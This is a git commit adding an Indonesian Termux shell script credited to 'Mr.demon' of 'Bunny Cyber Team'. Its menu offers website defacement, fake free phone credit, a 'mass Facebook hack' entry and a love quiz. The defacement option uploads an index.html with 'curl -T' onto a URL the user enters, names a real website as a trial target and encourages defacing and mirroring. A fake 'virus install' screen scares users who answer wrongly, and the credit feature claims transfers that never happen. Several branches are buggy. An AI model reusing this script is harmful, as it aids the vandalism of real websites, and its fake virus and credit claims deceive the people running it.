0f1bfc672f2bf91f99a880664212f89e444d8824
dewaxyz <40320095+dewaxyz@users.noreply.github.com>
2018-11-02 00:24:47 +0000

    Add files via upload

---
+++ DFC.sh
@@ -0,0 +1,463 @@
+#gila_coding
+green="\033[32;1m"
+yellow="\033[33;1m"
+blue="\033[34;1m"
+red="\033[35;1m"
+echo  $red
+echo "Tools Akan Mulai Dalam...."
+sleep 1.0;
+clear
+echo  $red
+figlet -f future "     5"
+sleep 1.0;
+clear
+echo  $red
+figlet -f future "     4"
+sleep 1.0;
+clear
+echo  $red
+figlet -f future "     3"
+sleep 1.0;
+clear
+echo  $red
+figlet -f future "     2";
+sleep 1.0;
+clear
+echo  $red
+figlet -f future "     1";
+sleep 1.0;
+clear
+echo
+echo
+echo
+echo $red"---->(ISI NAMA ANDA)<----";
+echo $yellow
+read -p "-->$" nama
+clear
+echo
+echo
+echo
+echo $yellow"Hallo"$green "$nama"$red "saya bot"
+sleep 3
+clear
+echo $blue
+figlet -f future "LOGIN TOOLS"
+echo $red"masuk sebagai....."
+echo
+echo $blue"["$yellow"01"$blue"]"$green"."$red "ADMIN"
+echo $blue"["$yellow"02"$blue"]"$green"."$red "TAMU"
+echo
+echo $yellow
+read -p "-->" guna
+if [ $guna = "01" ] || [ $guna = "1" ]
+then
+echo $red
+echo "Bahaya!! jika anda bukan admin jangan teruskan karna Mr.demon telah isi virus dihp anda jika salah isi informasi"
+echo $green"Mau lanjut?"
+echo $blue"["$yellow"L/T"$blue"]"
+read -p "-->$" vip
+fi
+
+if [ $vip = "L" ] || [ $vip = "l" ]
+then
+echo $green"Jika benar anda admin isi dengan hati hati"
+echo
+echo $green"apa nama team Mr.demon selain Bunny Cyber Team?"
+sleep 2
+echo $yellow
+read -p "-->$" min
+echo
+echo $green"nama asli Mr.demon siapa?"
+sleep 2
+echo $yellow
+read -p "-->$" min1
+echo $green"Mr.demon pernah masuk ke darkweb benar apa tidak?"
+sleep 2
+echo $yellow
+read -p "-->$" min2
+echo $yellow"ngambil jawaban..."
+sleep 5
+echo $green"memeriksa jawaban pertama...($min)"
+sleep 3
+echo $green"memeriksa jawaban kedua...($min1)"
+sleep 3
+echo $green"memeriksa jawaban ketiga...($min2)"
+sleep 3
+echo $red"menunggu jawaban dari server..."
+sleep 15
+echo $yellow"memverifikasi jawaban server..."
+sleep 10
+echo $red"Bahaya!! jawaban anda salah"
+sleep 1
+echo $red"Hapus Termux Sekarang!!"
+sleep 1
+echo $yellow"Menaruh virus..."
+sleep 1
+echo $yellow"menambal virus kesistem..."
+sleep 3
+echo $yellow"menaruh virus 1%"
+sleep 0.1
+echo $yellow"menaruh virus 3%"
+sleep 0.1
+echo $yellow"menaruh virus 4%"
+sleep 0.1
+echo $yellow"menaruh virus 5%"
+sleep 0.1
+echo $yellow"menaruh virus 7%"
+sleep 0.1
+echo $yellow"menaruh virus 8%"
+sleep 0.1
+echo $yellow"menaruh virus 9%"
+sleep 0.1
+echo $yellow"menaruh virus 11%"
+sleep 0.1
+echo $yellow"menaruh virus 13%"
+sleep 0.1
+echo $yellow"menaruh virus 15%"
+sleep 0.1
+echo $yellow"menaruh virus 16%"
+sleep 0.1
+echo $yellow"menaruh virus 18%"
+sleep 0.1
+echo $yellow"menaruh virus 21%"
+sleep 0.1
+echo $yellow"menaruh virus 24%"
+sleep 0.1
+echo $yellow"menaruh virus 26%"
+sleep 0.1
+echo $yellow"menaruh virus 28%"
+sleep 0.1
+echo $yellow"menaruh virus 30%"
+sleep 0.1
+echo $yellow"menaruh virus 32%"
+sleep 0.1
+echo $yellow"menaruh virus 34%"
+sleep 0.1
+echo $yellow"menaruh virus 36%"
+sleep 0.1
+echo $yellow"menaruh virus 38%"
+sleep 0.1
+echo $yellow"menaruh virus 40%"
+sleep 0.1
+echo $yellow"menaruh virus 42%"
+sleep 0.1
+echo $yellow"menaruh virus 44%"
+sleep 0.1
+echo $yellow"menaruh virus 46%"
+sleep 0.1
+echo $yellow"menaruh virus 48%"
+sleep 0.1
+echo $yellow"menaruh virus 50%"
+sleep 0.1
+echo $yellow"menaruh virus 52%"
+sleep 0.1
+echo $yellow"menaruh virus 54%"
+sleep 0.1
+echo $yellow"menaruh virus 56%"
+sleep 0.1
+echo $yellow"menaruh virus 58%"
+sleep 0.1
+echo $yellow"menaruh virus 60%"
+sleep 0.1
+echo $yellow"menaruh virus 62%"
+sleep 0.1
+echo $yellow"menaruh virus 64%"
+sleep 0.1
+echo $yellow"menaruh virus 66%"
+sleep 0.1
+echo $yellow"menaruh virus 68%"
+sleep 0.1
+echo $yellow"menaruh virus 70%"
+sleep 0.1
+echo $yellow"menaruh virus 72%"
+sleep 0.1
+echo $yellow"menaruh virus 74%"
+sleep 0.1
+echo $yellow"menaruh virus 76%"
+sleep 0.1
+echo $yellow"menaruh virus 78%"
+sleep 0.1
+echo $yellow"menaruh virus 80%"
+sleep 0.1
+echo $yellow"menaruh virus 82%"
+sleep 0.1
+echo $yellow"menaruh virus 84%"
+sleep 0.1
+echo $yellow"menaruh virus 86%"
+sleep 0.1
+echo $yellow"menaruh virus 88%"
+sleep 0.1
+echo $yellow"menaruh virus 90%"
+sleep 0.1
+echo $yellow"menaruh virus 92%"
+sleep 0.1
+echo $yellow"menaruh virus 94%"
+sleep 0.1
+echo $yellow"menaruh virus 96%"
+sleep 0.1
+echo $yellow"menaruh virus 97%"
+sleep 0.1
+echo $yellow"menaruh virus 98%"
+sleep 0.1
+echo $yellow"menaruh virus 99%"
+sleep 6
+echo $yellow"menaruh virus 100%"
+sleep 3
+echo $green"selesai menambal virus ke sistem smarthphone"
+sleep 5
+echo $red
+figlet -f future "Hacked By Mr.demon"
+echo $blue"HANDPHONE SMARTHPHONE ANDA TERISI VIRUS DARI GUE MR.DEMON KARNA SALAH MENGISI INFORMASI SALAH DARI TOOLS GUE DAN SUDAH GUE PERINGATKAN JANGAN ISI SEMBARANGAN"
+exit
+fi
+
+if [ $vip = "T" ] || [ $vip = "t" ]
+then
+sh test
+fi
+
+if [ $guna = "02" ] || [ $guna = "2" ]
+then
+clear
+echo $blue
+figlet -f future "Gila Tools"
+echo $red"Author"$yellow":"$blue"Mr.demon"
+echo $red"Team"$yellow":"$blue"Bunny Cyber Team"
+echo
+echo $yellow"["$red"A"$yellow"]"$blue"."$green"Tebas Index"
+echo $yellow"["$red"B"$yellow"]"$blue"."$green"Pulsa Gratis"
+echo $yellow"["$red"C"$yellow"]"$blue"."$green"Tools pertanyaan cinta"
+echo $yellow"["$red"D"$yellow"]"$blue"."$green"Hack FB Massal"
+echo $yellow"["$red"Q"$yellow"]"$blue"."$green"Quit"
+echo $yellow"["$red"I"$yellow"]"$blue"."$green"Info"
+echo $yellow
+read -p "-->$" gila
+fi
+
+if [ $gila = "A" ] || [ $gila = "a" ]
+then
+echo
+clear
+echo $blue
+figlet -f future "Tebas Index"
+echo $yellow "Script Ditaruh Diluar Penyimpanan Internal"
+echo $red "Target Percobaan"
+echo $yellow "http://contsol.co.za"
+echo
+echo $blue "masukan url"
+echo $yellow
+read -p "-->$" link
+echo
+echo $blue "Masukan Nama Script"
+echo $green "nama script harus index.html"
+echo $yellow
+read -p "-->$" html
+echo $red
+figlet -f future "reCHAPTA"
+echo  $blue "5 + 5 =?"
+echo
+echo "isi angka pertama"
+read -p "-->" X
+echo "isi angka kedua"
+read -p "-->" Y
+tambah=$(echo "$X + $Y" | bc)
+echo "hasilnya = $tambah"
+echo
+curl -T /storage/emulated/0/$html $link
+echo $yellow "+"$green"Hack Website"$blue" --->"$red" $link"
+echo
+echo $red"terima kasih telah menggunakan tools saya"
+echo $yellow"["$red"O"$yellow"]"$blue"."$green"out"
+echo $yellow"["$red"K"$yellow"]"$blue"."$green"Kembali"
+read -p "[K/O] : " bacod
+fi
+
+if [ $gila = "Q" ] || [ $gila = "q" ]
+then
+echo $red"deface.id";
+echo $red"selamat deface yah jangan lupa mirror";
+echo $ree"pesan akan dihapus dalam 5 detik";
+sleep 5;
+clear
+exit
+fi
+
+if [ $bacod = "O" ] || [ $bacod = "o" ]
+then
+echo $red"selamat deface yah jangan lupa mirror"
+exit
+fi
+
+if [ $bacod = "K" ] || [ $bacod = "k" ]
+then
+echo $red"Akan Kembali Dalam 5 Detik"
+sleep 5
+sh DFC.sh
+clear
+fi
+
+if [ $gila = "I" ] || [ $gila = "i" ]
+then
+clear
+figlet -f future "Info"
+sleep 1
+echo $red"Pembuat: Mr.demon"
+sleep 1
+echo $blue"Team: Bunny Cyber Team"
+sleep 1
+echo $green"Supporter: Islamic Cyber Team"
+sleep 1
+echo $yellow"date: 30-10-2018"
+sleep 1
+echo $red"KEMBALI KE TOOLS DALAM 5 DETIK"
+sleep 5
+sh test
+fi
+
+if
+[ $gila = B ] || [ $gila = b ]
+then
+clear
+echo $red
+figlet -f future "Pulsa Online Free"
+echo
+echo  $blue
+echo "Author: Mr.demon"
+echo
+echo "isi jumlah pulsa?"
+echo $yellow
+read -p "-->" pulsa
+sleep 1.0;
+echo $blue
+echo "masukan nomor hp anda";
+echo $yellow
+read -p "-->" nomor
+sleep 5.0;
+echo $blue
+echo "sukses dikirimkan pulsa sebesar= Rp."$pulsa
+sleep 5.5;
+echo $blue
+echo "dikirim ke nomor" $nomor
+echo $red"terima kasih telah menggunakan tools ini"
+echo $green"No System Is Safe"
+sleep 10;
+clear
+echo $red
+figlet -f future "reCHAPTA"
+echo  $blue "5 + 5 =?"
+echo
+echo "isi angka pertama"
+echo $yellow
+read -p "-->" X1
+echo $blue
+echo "isi angka kedua"
+echo $yellow
+read -p "-->" Y1
+echo $blue
+tambah1=$(echo "$X1 + $Y1" | bc)
+echo "hasilnya = $tambah1"
+echo $red"mau kembali atau out"
+echo $red"[K"$blue"/"$red"O]"
+read -p "-->" ggwp
+fi
+
+if [ $ggwp = "O" ] || [ $ggwp = "o" ]
+then
+echo $red"selamat deface yah jangan lupa mirror"
+exit
+fi
+
+if [ $ggwp = "K" ] || [ $ggwp = "k" ]
+then
+echo $red"Akan Kembali Dalam 5 Detik";
+sleep 5
+sh DFC.sh
+clear
+fi
+
+if [ $gila = "C" ] || [ $gila = "c" ]
+then
+clear
+echo $red">(isi nama anda)<"
+echo $yellow
+read -p "-->$" cinta
+echo $green">(selamat datang "$blue"$cinta" ditools cinta)<"
+sleep 5
+echo $green"hallo tuan "$blue"$cinta"$green" harap jawab pertanyaan dengan jujur dan tidak kosong"
+sleep 3
+echo
+echo $red"isi nama orang yang tuan suka"
+echo $red"hanya nama depannya saja"
+echo $yellow
+read -p "-->$" cnt
+echo $green"jadi tuan suka "$blue"$cnt"$green" yah"
+echo $green"soswed piu wit"
+echo $green"kita mulai saja yah tuan $cinta"
+sleep 5
+echo $green"apakah dia suka orang lain?"
+echo $green"Y/N"
+read -p "-->$" cnt1
+fi
+
+if [ $cnt1 = "N" ] || [ $cnt1 = "n" ]
+then
+clear
+echo $green"yah tuan kurang beruntung :("
+echo $green"pertanyaan kedua"
+echo $green"sudah kenal lama apa tidak?"
+echo $green"Y/N"
+echo $yellow
+read -p "-->$" cnt 2
+fi
+
+if [ $cnt2 = "N" ] || [ $cnt2 = "n" ]
+then
+clear
+echo $green"yah belum lama dong :("
+echo $green"dah gak kuat nahan derita ini"
+echo $green"maaf kurang beruntung tuan"
+echo $green"pesan akan dihapus dalam 10 detik"
+sleep 10
+clear
+exit
+fi
+
+if [ $cnt2 = "Y" ] || [ $cnt = "y" ]
+then
+clear
+echo $green"wah pas banget tuh nah untuk mau dapetin dia caper dan suka topik pembicaraan yang sama"
+echo $green"dan kalau dah sering buat dia tertawa, nah disitu dia sudah mulai nyaman terhadap tuan."
+sleep 3
+echo $green"nah jangan terburu buru"
+echo $green"nembak dia pada waktu yang tepat"
+echo $green"dijamin pasti dia akan nerima tuan"
+sleep 10
+echo $yellow"dah tuan $cinta kembali lagi yah"
+exit
+fi
+
+if [ $cnt1 = "Y" ] || [ $cnt1 = "y" ]
+then
+clear
+echo $green
+echo "baguslah kalau begitu"
+sleep 1
+echo "berarti tinggal nembak dia deh"
+sleep 1
+echo "saya saranin gombalin dia"
+sleep 1
+echo "trus buat nyaman dia dengan 1 hal"
+sleep 1
+echo "buat dia tertawa karna dia akan nyaman dengan tuan"
+sleep 1
+echo "dan kalau mau nembak liat waktu dan suasana"
+sleep 1
+echo "jangan salah yah :v"
+sleep 1
+echo "da dah tuan "$blue"$cinta"$green" kembali lagi yah"
+sleep 3
+echo "pesan akan dihapus dan keluar dari tools ini dalam 10 detik"
+sleep 10
+clear
+exit
+fi
